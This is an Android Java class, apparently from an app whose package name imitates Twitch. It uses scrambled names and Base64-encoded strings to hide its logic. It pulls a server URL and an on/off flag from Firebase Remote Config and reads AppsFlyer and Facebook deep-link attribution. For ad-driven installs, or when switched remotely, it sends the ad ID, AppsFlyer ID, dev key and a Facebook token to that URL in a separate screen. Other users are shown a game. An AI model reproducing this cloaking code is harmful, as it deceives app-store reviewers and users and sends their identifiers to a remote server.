package tv.twitch.android.a.modGM;

import static tv.twitch.android.a.actGM.BUActivityGM.decodeGM;

import android.app.Application;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.Map;

import tv.twitch.android.a.R;
import tv.twitch.android.a.actGM.BUActivityGM;
import tv.twitch.android.a.actGM.StartActivityGM;

public class GM {


    public static String vdsvduv = "q";
    public static String vsdvdkf;
    FirebaseRemoteConfig bfdbd;
    public static String bfdvfd = null;
    public static String vsdgdwf = "-";
    Application application;
    StartActivityGM startActivityGM;
    public static String vdbds;
    public static String nnfgdf = "-";
    public static String nnfdv;
    public static String nnhg;
    public static String ewdc = "R9J2zAYgcCTYjdayBtLTk7";
    public static String vdtcfsa;
    public static String vsgsg;
    public static String bntdd;
    String vssvte = "tv.twitch.android.a";


    public StartActivityGM getStartActivityGM() {
        return startActivityGM;
    }

    public void setStartActivityGM(StartActivityGM startActivityGM) {
        this.startActivityGM = startActivityGM;
    }

    public GM(Application application) {
        this.application = application;
    }

    public void connectGM(StartActivityGM startActivityGM) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                bfdbd = FirebaseRemoteConfig.getInstance();
                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(2500)
                        .build();
                bfdbd.setConfigSettingsAsync(configSettings);

                bfdbd.fetchAndActivate()
                        .addOnCompleteListener(startActivityGM, new OnCompleteListener<Boolean>() {
                            @Override
                            public void onComplete(@NonNull Task<Boolean> task) {
                                if (task.isSuccessful()) {
                                    boolean updated = task.getResult();
                                    Log.d("weq", updated + "");
                                    vdsvduv = bfdbd.getString("sta");
                                    vsdvdkf = bfdbd.getString("u");
                                    Log.d("weq", vdsvduv);
                                    Log.d("weq", vsdvdkf);

                                } else {

                                }

                            }
                        });

            }
        }).start();
    }

    public void kfd() {

        AppsFlyerLib.getInstance().init(ewdc, new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                nnfgdf = map.get(decodeGM("YWZfc3RhdHVz")).toString();
                Log.d("weq", nnfgdf);
                if (nnfgdf.equals(decodeGM("Tm9uLW9yZ2FuaWM="))) {


                    try {
                        vdtcfsa = map.get(decodeGM("Y2FtcGFpZ24=")).toString();
                    } catch (Exception e) {

                    }

                    try {

                        vsgsg = map.get(decodeGM("bWVkaWFfc291cmNl")).toString();
                    } catch (Exception e) {

                    }

                    try {

                        bntdd = map.get(decodeGM("YWZfY2hhbm5lbA==")).toString();
                    } catch (Exception e) {

                    }

                    nnhg = parseIF(vdtcfsa);
                }
            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        }, application);
        AppsFlyerLib.getInstance().start(application);
    }
    String vdsdgs;
    String vdgshd;
    String vdhsus;
    String vvv;
    String zzzz;
    String nnnb;
    String yyyt;
    String qqwqwq;
    String ooiyu;
    String bgfds;
    private String parseIF(String vsfs) {
        String ngdfvs = startActivityGM.getResources().getString(R.string.id);
        String bfsfwd = startActivityGM.getResources().getString(R.string.tok);



        String[] bbgds = vsfs.split("_");

        try {
            vdsdgs = bbgds[0];
        } catch (Exception e) {

            vdsdgs = "";
        }
        try {
            vdgshd = bbgds[1];
        } catch (Exception e) {

            vdgshd = "";
        }
        try {
            vdhsus = bbgds[2];
        } catch (Exception e) {
            vdhsus = "";

        }
        try {
            vvv = bbgds[3];
        } catch (Exception e) {
            vvv = "";

        }
        try {
            zzzz = bbgds[4];
        } catch (Exception e) {
            zzzz = "";
            ;
        }
        try {
            nnnb = bbgds[5];
        } catch (Exception e) {
            nnnb = "";

        }

        try {
            yyyt = bbgds[6];
        } catch (Exception e) {
            yyyt = "";
        }
        try {
            qqwqwq = bbgds[7];
        } catch (Exception e) {
            qqwqwq = "";
        }
        try {
            ooiyu = bbgds[8];
        } catch (Exception e) {
            ooiyu = "";
        }
        try {
            bgfds = bbgds[9];
        } catch (Exception e) {
            bgfds = "";
        }


        String gdwfs[] = {vsgsg, vdsdgs, vdgshd, vdhsus, vvv, zzzz, nnnb, yyyt, qqwqwq, ooiyu, bgfds, vdtcfsa, nnfdv, vdbds, bntdd, ewdc, vssvte, ngdfvs, bfsfwd};

        String fds[] = {decodeGM("P21lZGlhX3NvdXJjZT0="),
                decodeGM("JnN1YjE9"),
                decodeGM("JnN1YjI9"),
                decodeGM("JnN1YjM9"),
                decodeGM("JnN1YjQ9"),
                decodeGM("JnN1YjU9"),
                decodeGM("JnN1YjY9"),
                decodeGM("JnN1Yjc9"),
                decodeGM("JnN1Yjg9"),
                decodeGM("JnN1Yjk9"),
                decodeGM("JnN1YjEwPQ=="),
                decodeGM("JmNhbXBhaWduPQ=="),
                decodeGM("Jmdvb2dsZV9hZGlkPQ=="),
                decodeGM("JmFmX3VzZXJpZD0="),
                decodeGM("JmFmX2NoYW5uZWw9"),
                decodeGM("JmRldl9rZXk9"),
                decodeGM("JmJ1bmRsZT0="),
                decodeGM("JmZiX2FwcF9pZD0="),
                decodeGM("JmZiX2F0PQ==")};


        StringBuilder bbbbf = new StringBuilder();
        for (int i = 0; i < gdwfs.length; i++) {
            bbbbf.append(fds[i]);
            bbbbf.append(gdwfs[i]);
        }

        return bbbbf.toString();

    }

    public void gf() {
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();
        AppEventsLogger.activateApp(application);

        AppLinkData.fetchDeferredAppLinkData(startActivityGM.getApplicationContext(), new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {
                if (appLinkData == null) {
                    appLinkData = AppLinkData.createFromActivity(startActivityGM);

                }
                if (appLinkData != null) {

                    String[] as = appLinkData.getTargetUri().toString().split("://");
                    bfdvfd = as[1];
                    vsdgdwf = parseIF(bfdvfd);

                } else {

                }
            }
        });
    }


    int jj;

    public void fgd(StartActivityGM startActivityGM) {
        Handler nngf = new Handler();
        nngf.post(new Runnable() {
            @Override
            public void run() {

                if (!nnfgdf.equals("-") || !vsdgdwf.equals("-")) {
                    if (nnfgdf.equals(decodeGM("Tm9uLW9yZ2FuaWM="))) {
                        String vdrds = vsdvdkf + nnhg;
                        kgn(vdrds);
                        ufn(vdrds);
                        Log.d("weq", "app" + vdrds);
                        jj = 1;

                    } else if (bfdvfd != null) {
                        String tytew = vsdvdkf + vsdgdwf;
                        kgn(tytew);
                        ufn(tytew);
                        jj = 1;
                        Log.d("weq", "deep" + tytew);

                    } else {
                        if (vdsvduv.equals("0")) {
                            kkf();
                            jj = 1;
                            Log.d("weq", "game");

                        } else {

                            dhdk();

                        }
                    }

                } else {
                }

                if (jj != 1) {
                    nngf.postDelayed(this::run, 1000);
                }
            }
        });


    }

    private void kgn(String fff) {
        startActivityGM.getSharedPreferences(startActivityGM.getPackageName(), startActivityGM.MODE_PRIVATE).edit().putString(decodeGM("c2F2ZWRVcmw="), fff).apply();
    }

    private void dhdk() {
        String dd = startActivityGM.getResources().getString(R.string.id);
        String gg = startActivityGM.getResources().getString(R.string.tok);
        String bfrew = vsdvdkf + decodeGM("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                decodeGM("Jmdvb2dsZV9hZGlkPQ==") + nnfdv +
                decodeGM("JmFmX3VzZXJpZD0=") + vdbds +
                decodeGM("JmRldl9rZXk9") + ewdc +
                decodeGM("JmJ1bmRsZT0=") + startActivityGM.getPackageName() +
                decodeGM("JmZiX2FwcF9pZD0=") + dd +
                decodeGM("JmZiX2F0PQ==") + gg;
        kgn(bfrew);
        ufn(bfrew);
        jj = 1;
        Log.d("weq", "org" + bfrew);
    }

    private void ufn(String ddd) {
        Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
        intent.putExtra("buuul", true);
        intent.putExtra("urr", ddd);
        startActivityGM.startActivity(intent);
    }

    private void kkf() {
        Intent intent = new Intent(startActivityGM.getApplicationContext(), BUActivityGM.class);
        intent.putExtra("buuul", false);
        startActivityGM.startActivity(intent);
    }


}
